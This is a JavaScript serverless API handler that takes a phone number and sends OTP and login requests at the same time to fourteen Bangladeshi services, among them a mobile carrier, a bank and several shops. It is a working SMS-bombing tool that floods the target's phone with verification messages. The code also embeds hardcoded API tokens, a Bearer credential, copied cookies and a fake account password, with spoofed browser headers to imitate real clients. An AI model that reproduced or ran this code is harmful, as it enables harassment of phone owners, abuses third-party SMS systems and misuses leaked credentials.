export default async function handler(req, res) {
    if (req.method !== "GET") {
        return res.status(405).json({ error: "Method Not Allowed", methodReceived: req.method });
    }

    const phone = req.query.phone; // Get phone number from URL query

    if (!phone) {
        return res.status(400).json({ error: "Phone number is required" });
    }

    // API Configurations
    const apis = [
        {
            name: "ali2bd",
            url: "https://edge.ali2bd.com/api/consumer/v1/auth/login",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Origin": "https://ali2bd.com",
                "Referer": "https://ali2bd.com/",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username: `+88${phone}` })
        },
        {
            name: "apex4u",
            url: "https://api.apex4u.com/api/auth/login",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
            },
            body: JSON.stringify({ phoneNumber: phone })
        },
        {
            name: "applink",
            url: "https://applink.com.bd/appstore-v4-server/login/otp/request",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Referer": "https://applink.com.bd/",
                "Content-Type": "application/json",
                "Origin": "https://applink.com.bd"
            },
            body: JSON.stringify({ msisdn: `88${phone}` })
        },
        {
            name: "banglalink",
            url: "https://myblapi.banglalink.net/api/v1/send-otp",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ phone: phone })
        },
        {
            name: "chokrojan",
            url: "https://chokrojan.com/api/v1/passenger/login/mobile",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "domain-name": "chokrojan.com",
                "user-platform": "3",
                "company-id": "1",
                "Origin": "https://chokrojan.com",
                "Referer": "https://chokrojan.com/login",
                "Cookie": "_ga_TXX7J24H07=GS1.1.1681140800.3.1.1681142406.0.0.0; _ga=GA1.1.162112941.1678173405; _fbp=fb.1.1678173407195.536316567",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ mobile_number: phone })
        },
        {
            name: "mygp",
            url: `https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88${phone}/`,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json"
            },
            body: null // No body data needed as it uses URL parameters
        },
        {
            name: "chinaonline",
            url: `https://chinaonlineapi.com/api/v1/get/otp?phone=${phone}`,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "token": "gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219",
                "Origin": "https://chinaonlinebd.com",
                "Referer": "https://chinaonlinebd.com/"
            },
            body: null // No body data needed as it uses URL parameters
        },
        {
            name: "hishabee",
            url: "https://app.hishabee.business/api/V2/number_check",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ mobile_number: phone })
        },
        {
            name: "cineplex",
            url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/otp-resend",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ r_token: "jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6", msisdn: phone })
        },
        {
            name: "ezybank",
            url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
            },
            body: JSON.stringify({
                AccessToken: "",
                TrackingNo: "",
                mobileNo: phone,
                otpSms: "",
                product_id: "250",
                requestChannel: "MOB",
                trackingStatus: 5
            })
        },
        {
            name: "deeptoplay",
            url: "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ number: phone })
        },
        {
            name: "iqra-live",
            url: `http://apibeta.iqra-live.com/api/v1/sent-otp/${phone}`,
            headers: {},
            body: null // No body data needed, it's in the URL
        },
        {
            name: "mcbaffiliate",
            url: "https://www.mcbaffiliate.com/Affiliate/RequestOTP",
            headers: {
                "User-Agent": "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `PhoneNumber=${phone}`
        },
        {
            name: "mithaibd",
            url: "https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT",
            headers: {
                "user-agent": "okhttp/4.2.2",
                "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                company_id: "2",
                password2: "Rahu333@@",
                currency_code: "BDT",
                user_type: "C",
                email: "fuckyoubro@gmail.com",
                g_id: "",
                lang_code: "en",
                operating_system: "Android",
                otp_verify: false,
                password1: "Rahu333@@",
                phone: phone,
                storefront_id: "5"
            })
        }
    ];

    try {
        // Send requests to all APIs simultaneously
        const responses = await Promise.all(
            apis.map(async (api) => {
                try {
                    const response = await fetch(api.url, {
                        method: "POST", // Use POST request as needed
                        headers: api.headers,
                        body: api.body // Only include body if required
                    });

                    const data = await response.json();
                    return { service: api.name, status: response.status, response: data };
                } catch (error) {
                    return { service: api.name, error: error.message };
                }
            })
        );

        return res.status(200).json({ results: responses });
    } catch (error) {
        return res.status(500).json({ error: "Internal Server Error", details: error.message });
    }
}

